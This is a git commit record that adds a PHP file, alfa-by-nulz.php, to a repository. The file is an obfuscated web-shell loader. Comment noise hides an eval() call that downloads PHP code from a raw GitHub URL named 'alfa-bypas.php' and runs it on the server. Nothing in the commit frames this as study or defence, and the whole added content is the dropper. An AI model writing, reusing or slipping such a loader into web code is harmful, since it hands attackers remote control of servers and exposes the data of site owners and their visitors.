b2d39787e1a6a65f1a9a2d38e580f65a07deb48b
eximiaturkey-sudo <eximiaturkey@gmail.com>
2025-10-01 21:54:34 +0700

    Add files via upload

---
+++ alfa-by-nulz.php
@@ -0,0 +1,2 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/eximiaturkey-sudo/backup/refs/heads/main/alfa-bypas.php"))/******/ /*By NuLz404*/?>
+<?php // NuLz Ganteng ?>
